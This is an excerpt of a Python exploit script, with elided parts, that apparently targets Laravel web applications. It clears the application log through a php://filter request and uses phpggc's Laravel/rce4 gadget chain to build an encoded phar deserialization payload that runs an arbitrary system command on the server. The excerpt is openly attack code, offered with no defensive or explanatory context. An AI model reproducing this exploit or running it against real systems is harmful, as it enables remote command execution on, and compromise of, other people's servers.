...
def clear_log(url='', viewFile=''):
    ...
    while (requests.post(url=url, json=data, headers=header).status_code != 200): pass
...
def generate_payload(command='', padding=0):
    if '/' in command:
        ...
        command = command.replace('\'', '\\\'')
    os.system(r'''php -d'phar.readonly=0' ./phpggc/phpggc Laravel/rce4 system '%s' --phar phar -o php://output | base64 -w0 | sed -E 's/./\0=00/g' > payload.txt'''%(command))
    payload = ''
...
def main():
    ...
    print('\nExploit...')
    clear_log(url, 'php://filter/read=consumed/resource=%s'%(path_log))
    print('Cleared log')
